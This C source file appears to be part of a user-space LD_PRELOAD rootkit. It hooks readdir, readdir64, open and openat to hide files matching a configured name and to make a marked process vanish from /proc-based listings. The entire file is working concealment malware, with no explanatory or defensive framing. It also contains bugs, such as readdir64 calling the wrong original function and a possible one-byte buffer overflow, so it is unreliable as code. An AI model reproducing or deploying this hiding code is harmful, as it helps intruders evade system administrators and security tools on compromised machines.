#include "./config.h"


static struct dirent *(*orig_readdir)(DIR *dirp) = NULL;
static struct dirent *(*orig_readdir64)(DIR *dirp) = NULL;
static int (*orig_open)(const char *pathname, int flags, mode_t mode) = NULL;
static int (*orig_openat)(int dirfd, const char *pathname, int flags, mode_t mode) = NULL;


void init_funcs() {
	if(!orig_readdir) orig_readdir = dlsym(RTLD_NEXT, "readdir");
	if(!orig_readdir64) orig_readdir64 = dlsym(RTLD_NEXT, "readdir64");
	if(!orig_open) orig_open = dlsym(RTLD_NEXT, "open");
	if(!orig_openat) orig_openat = dlsym(RTLD_NEXT, "openat");
	
}

struct dirent  *readdir(DIR *dirp) {
	init_funcs();

	struct dirent *entry;

	while((entry = orig_readdir(dirp)) != NULL) {
		if(strstr(entry->d_name, FILE_TO_HIDE) == 0) {
			return entry;
		}
	}

	return NULL;

}



struct dirent  *readdir64(DIR *dirp) {
	init_funcs();



	struct dirent *entry;

	while((entry = orig_readdir(dirp)) != NULL) {
		if(strstr(entry->d_name, FILE_TO_HIDE) == 0) {
			return entry;
		}
	}

	return NULL;

}




int openat(int dirfd, const char *pathname, int flags, ...) {
	if(!orig_open) orig_open = dlsym(RTLD_NEXT, "open");
	if(!orig_openat) orig_openat = dlsym(RTLD_NEXT, "openat");

	mode_t mode = 0;
	if(flags & O_CREAT) {
        va_list args;
        va_start(args, flags);
        mode = va_arg(args, mode_t);
        va_end(args);
    }


    if(
       strstr(pathname, "stat") != NULL) {

		int fd = orig_openat(dirfd, pathname, flags, 0);
		if(fd < 0) {
			return fd;
		}
		char buffer[850];
		ssize_t bytes_read = read(fd, buffer, sizeof(buffer));

		close(fd);

        buffer[bytes_read] = '\0';
            
            // If this IS "sleep", we want to hide it
        if (strstr(buffer, MAGIC_PROC) != 0) {
            errno = ENOENT;
            return -1;
        }
        
		
	}
	if(flags & O_CREAT) {
		return orig_openat(dirfd, pathname, flags, mode);
	} else {
		return orig_openat(dirfd, pathname, flags, 0);
	}

}





int open(const char *pathname, int flags, ...)
{
	if(!orig_open) orig_open = dlsym(RTLD_NEXT, "open");
	

	mode_t mode = 0;
	if(flags & O_CREAT) {
        va_list args;
        va_start(args, flags);
        mode = va_arg(args, mode_t);
        va_end(args);
    }


    if(strstr(pathname, "proc") != NULL || 
       strstr(pathname, "cmdline") != NULL || 
       strstr(pathname, "stat") != NULL) {

		int fd = orig_open(pathname, O_RDONLY, 0);
		if(fd < 0) {
			return fd;
		}
		char buffer[850];
		ssize_t bytes_read = read(fd, buffer, sizeof(buffer));

		close(fd);
		if (bytes_read > 0) {
            buffer[bytes_read] = '\0';
            
            // If this IS "sleep", we want to hide it
            if (strstr(buffer, MAGIC_PROC) != NULL) {
                
                errno = ENOENT;
                return -1;
            }
        }
		
	}
	if(flags & O_CREAT) {
		return orig_open(pathname, flags, mode);
	} else {
		return orig_open(pathname, flags, 0);
	}
}
